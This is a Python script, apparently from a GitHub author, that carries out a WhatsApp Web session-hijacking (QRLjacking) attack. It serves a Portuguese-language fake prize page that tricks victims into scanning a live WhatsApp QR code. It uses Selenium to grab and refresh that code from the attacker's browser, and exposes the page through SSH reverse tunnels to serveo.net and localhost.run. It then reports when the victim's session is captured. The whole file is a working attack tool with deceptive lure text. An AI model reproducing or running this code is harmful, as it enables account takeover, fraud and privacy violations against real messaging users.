# Author: https://github.com/zr0n

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import base64
from time import sleep
import os
import http.server
import socketserver
import threading
import subprocess
import time
import requests
import random
import socket
import psutil
import signal

# Configurações - porta dinâmica para evitar conflitos
PHISHING_PORT = random.randint(8000, 9000)

# HTML atualizado
PHISHING_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parabéns! Você foi sorteado!</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); margin: 0; padding: 20px; color: white; text-align: center; }
        .container { max-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        .whatsapp-logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { color: #128C7E; font-size: 28px; margin-bottom: 15px; }
        .qr-container { margin: 25px auto; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px dashed #25D366; }
        .qr-code { max-width: 300px; margin: 0 auto; }
        .qr-code img { width: 100%; height: auto; border: 1px solid #ddd; border-radius: 5px; }
        .instructions { background: #E8F5E9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
        .prize { font-size: 22px; color: #E91E63; font-weight: bold; margin: 20px 0; padding: 15px; background: #FFF3E0; border-radius: 8px; border: 2px solid #FF9800; }
        .timer { font-size: 16px; color: #D32F2F; font-weight: bold; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="whatsapp-logo">📱</div>
        <h1>🎉 PARABÉNS! VOCÊ FOI SORTEADO! 🎉</h1>
        <div class="prize">🏆 PRÊMIO: iPhone 15 Pro Max + R$ 5.000 🏆</div>
        <p>Para validar e resgatar seu prêmio, <strong>faça login no WhatsApp Web</strong> escaneando o QR Code abaixo:</p>
        <div class="qr-container">
            <div class="qr-code">
                <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code do WhatsApp" id="qrImage">
            </div>
        </div>
        <div class="timer">⏳ TEMPO RESTANTE: <span id="countdown">05:00</span></div>
        <div class="instructions">
            <h3>📋 Como resgatar seu prêmio:</h3>
            <ol>
                <li>Abra o WhatsApp no seu celular</li>
                <li>Toque em <strong>Menu → WhatsApp Web</strong></li>
                <li>Aponte a câmera para o QR Code acima</li>
                <li>Seu prêmio será liberado automaticamente após o login!</li>
            </ol>
        </div>
        <p><strong>⚠️ ATENÇÃO:</strong> Você tem apenas 5 minutos para escanear o QR code e garantir seu prêmio!</p>
    </div>

    <script>
        function updateQRCode() {
            const img = document.getElementById('qrImage');
            img.src = '/qr.png?t=' + new Date().getTime();
            setTimeout(updateQRCode, 3000);
        }
        function startCountdown() {
            let timeLeft = 5 * 60;
            const countdownElement = document.getElementById('countdown');
            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.textContent = "TEMPO ESGOTADO!";
                    countdownElement.style.color = "#D32F2F";
                }
                timeLeft--;
            }, 1000);
        }
        updateQRCode();
        startCountdown();
        window.onload = function() {
            setTimeout(() => {
                alert("🎊 Parabéns! Você ganhou um iPhone 15 + R$ 5.000! Escaneie o QR Code com o WhatsApp para resgatar.");
            }, 1000);
        };
    </script>
</body>
</html>
"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_with_timestamp = PHISHING_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
            self.wfile.write(html_with_timestamp.encode())
        elif self.path.startswith('/qr.png'):
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                with open('qr.png', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def kill_process_on_port(port):
    """Mata processos usando a porta especificada"""
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                connections = proc.connections()
                for conn in connections:
                    if conn.laddr.port == port:
                        print(f"🔄 Matando processo {proc.pid} usando porta {port}")
                        os.kill(proc.pid, signal.SIGTERM)
                        time.sleep(2)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as e:
        print(f"⚠️ Erro ao matar processos na porta {port}: {e}")

def find_available_port(start_port=8000, end_port=9000):
    """Encontra uma porta disponível"""
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('', port))
                return port
        except OSError:
            continue
    raise Exception("Nenhuma porta disponível encontrada")

def start_phishing_server():
    """Inicia servidor phishing com porta dinâmica"""
    global PHISHING_PORT
    
    max_attempts = 5
    for attempt in range(max_attempts):
        try:
            # Tentar matar processos na porta atual
            kill_process_on_port(PHISHING_PORT)
            
            with socketserver.TCPServer(("", PHISHING_PORT), PhishingHandler) as httpd:
                print(f"✅ Servidor phishing rodando na porta {PHISHING_PORT}")
                httpd.serve_forever()
                break
                
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"⚠️ Porta {PHISHING_PORT} ocupada, tentando outra...")
                PHISHING_PORT = find_available_port()
                time.sleep(1)
            else:
                print(f"❌ Erro no servidor: {e}")
                break
    else:
        print("❌ Não foi possível iniciar o servidor após várias tentativas")

def check_port_open(host, port):
    """Verifica se uma porta está aberta"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def execute_ssh_tunnel(command, service_name, timeout=30):
    """Executa comando SSH e captura URL de forma robusta"""
    try:
        print(f"🔧 Tentando {service_name}...")
        
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        start_time = time.time()
        url = None
        
        # Monitorar processo em tempo real
        while time.time() - start_time < timeout and url is None:
            if process.poll() is not None:
                break
                
            # Tentar ler stdout
            try:
                output = process.stdout.readline()
                if output:
                    print(f"[{service_name}] {output.strip()}")
                    
                    # Procurar URLs no output
                    if 'https://' in output and ('serveo.net' in output or 'lhr.life' in output or 'lhr.run' in output):
                        import re
                        patterns = [
                            r'https://[a-zA-Z0-9.-]+\.serveo\.net',
                            r'https://[a-zA-Z0-9.-]+\.lhr\.life',
                            r'https://[a-zA-Z0-9.-]+\.lhr\.run',
                        ]
                        
                        for pattern in patterns:
                            match = re.search(pattern, output)
                            if match:
                                url = match.group(0)
                                print(f"✅ {service_name} URL: {url}")
                                break
            except:
                pass
                
            time.sleep(0.5)
        
        if url:
            return url, process
        else:
            if process.poll() is None:
                process.terminate()
            return None, None
            
    except Exception as e:
        print(f"❌ Erro em {service_name}: {e}")
        return None, None

def setup_simple_tunnel():
    """Configura túnel simplificado"""
    strategies = [
        {
            'name': 'Serveo.net',
            'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30', '-R', '80:localhost:' + str(PHISHING_PORT), 'serveo.net']
        },
        {
            'name': 'Localhost.run', 
            'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30', '-R', '80:localhost:' + str(PHISHING_PORT), 'nokey@localhost.run']
        }
    ]
    
    for strategy in strategies:
        print(f"🔄 Tentando {strategy['name']}...")
        url, process = execute_ssh_tunnel(strategy['command'], strategy['name'])
        if url:
            return url, process
        print(f"❌ {strategy['name']} falhou")
    
    return None, None

def get_local_ips():
    """Obtém IPs locais"""
    local_ips = []
    try:
        # IP local
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        local_ips.append(('localhost', f"http://localhost:{PHISHING_PORT}"))
        local_ips.append(('IP Local', f"http://{local_ip}:{PHISHING_PORT}"))
        
        # Interface de rede
        import netifaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    if ip not in ['127.0.0.1', local_ip] and (ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.')):
                        local_ips.append(('Rede Local', f"http://{ip}:{PHISHING_PORT}"))
    except:
        local_ips.append(('localhost', f"http://localhost:{PHISHING_PORT}"))
    
    return local_ips

def start_whatsapp_hijacking():
    """Inicia o session hijacking do WhatsApp"""
    print("\n📱 INICIANDO WHATSAPP SESSION HIJACKING")
    
    try:
        # Configurar options para evitar problemas
        from selenium.webdriver.firefox.options import Options
        options = Options()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        
        browser = webdriver.Firefox(options=options)
        browser.get("https://web.whatsapp.com/")

        print("⏳ Aguardando QR Code...")
        try:
            # Tentar diferentes seletores para o QR code
            selectors = [
                "canvas",
                "div[data-ref] canvas",
                "canvas[aria-label='Scan me!']"
            ]
            
            canvas = None
            for selector in selectors:
                try:
                    canvas = WebDriverWait(browser, 20).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    print(f"✅ Canvas encontrado com seletor: {selector}")
                    break
                except:
                    continue
            
            if not canvas:
                raise Exception("Canvas não encontrado com nenhum seletor")
                
        except Exception as e:
            print(f"❌ Erro ao encontrar canvas: {e}")
            browser.quit()
            return None

        def get_canvas_base64():
            try:
                # Encontrar canvas novamente
                canvas = browser.find_element(By.CSS_SELECTOR, "canvas")
                data_url = browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
                return data_url
            except Exception as e:
                print(f"⚠️ Erro ao extrair QR Code: {e}")
                return None

        # QR Code inicial
        src = get_canvas_base64()
        if src:
            base64_data = src.replace("data:image/png;base64,", "")
            with open("qr.png", "wb") as f:
                f.write(base64.b64decode(base64_data))
            print("✅ QR Code inicial salvo")
        else:
            print("❌ Falha ao obter QR Code inicial")
            browser.quit()
            return None

        if os.path.isfile('hacked'):
            os.remove('hacked')

        print("🎯 Aguardando vítima escanear o QR Code...")
        
        while True:
            # Verificar botão de recarregar
            try:
                reload_selectors = [
                    "//span[contains(text(), 'Recarregar')]",
                    "//span[contains(text(), 'Reload')]",
                    "//button[contains(., 'Recarregar')]",
                    "//button[contains(., 'Reload')]"
                ]
                
                for selector in reload_selectors:
                    try:
                        reload_button = browser.find_element(By.XPATH, selector)
                        reload_button.click()
                        print("🔄 QR Code recarregado")
                        time.sleep(2)
                        break
                    except:
                        continue
            except:
                pass

            # Verificar se ainda está no QR code ou se fez login
            try:
                canvas = WebDriverWait(browser, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "canvas"))
                )
                new_src = get_canvas_base64()
                if new_src and new_src != src:
                    src = new_src
                    base64_data = new_src.replace("data:image/png;base64,", "")
                    with open("qr.png", "wb") as f:
                        f.write(base64.b64decode(base64_data))
                    print("✅ QR Code atualizado")
            except TimeoutException:
                print("🎉 VÍTIMA FEZ LOGIN! Sessão capturada!")
                with open('hacked', 'w') as f:
                    f.write('')
                break
            except Exception as e:
                print(f"⚠️ Erro: {e}")

            time.sleep(3)

        print("✅ Sessão do WhatsApp capturada!")
        return browser
        
    except Exception as e:
        print(f"❌ Erro no WhatsApp hijacking: {e}")
        return None

def main():
    print("🚀 INICIANDO ATAQUE DE PHISHING + WHATSAPP HIJACKING")
    print(f"🔧 Usando porta: {PHISHING_PORT}")
    
    # Limpar processos antigos
    kill_process_on_port(PHISHING_PORT)
    time.sleep(2)
    
    # Iniciar servidor em thread separada
    server_thread = threading.Thread(target=start_phishing_server, daemon=True)
    server_thread.start()
    
    # Aguardar servidor iniciar
    print("⏳ Iniciando servidor...")
    time.sleep(3)
    
    # Verificar se servidor está rodando
    if not check_port_open('localhost', PHISHING_PORT):
        print("❌ Servidor não iniciou corretamente. Reiniciando...")
        kill_process_on_port(PHISHING_PORT)
        time.sleep(2)
        server_thread = threading.Thread(target=start_phishing_server, daemon=True)
        server_thread.start()
        time.sleep(3)
    
    # Obter URLs locais
    local_urls = get_local_ips()
    
    print(f"\n🎯 URLs DE ACESSO LOCAL:")
    for name, url in local_urls:
        print(f"   {name}: {url}")
    
    # Tentar túnel público
    print("\n🌐 CONFIGURANDO TÚNEL PÚBLICO...")
    tunnel_url, tunnel_process = setup_simple_tunnel()
    
    if tunnel_url:
        print(f"✅ Túnel Público: {tunnel_url}")
    else:
        print("❌ Túneis públicos falharam. Usando apenas acesso local.")
    
    # Iniciar WhatsApp hijacking
    print("\n📱 INICIANDO CAPTURA DO WHATSAPP...")
    browser = start_whatsapp_hijacking()
    
    print("\n" + "="*60)
    print("✅ SISTEMA PRONTO!")
    if tunnel_url:
        print(f"🌐 URL Pública: {tunnel_url}")
    for name, url in local_urls[:2]:  # Mostrar apenas 2 URLs locais
        print(f"🏠 {name}: {url}")
    print("⏹️  Pressione Ctrl+C para encerrar")
    print("="*60)
    
    # Manter sistema rodando
    try:
        while True:
            time.sleep(10)
            # Verificar se servidor ainda está rodando
            if not check_port_open('localhost', PHISHING_PORT):
                print("⚠️ Servidor caiu! Reiniciando...")
                server_thread = threading.Thread(target=start_phishing_server, daemon=True)
                server_thread.start()
                time.sleep(3)
                
    except KeyboardInterrupt:
        print("\n🛑 Encerrando...")
        if browser:
            try:
                browser.quit()
            except:
                pass
        kill_process_on_port(PHISHING_PORT)

if __name__ == "__main__":
    main()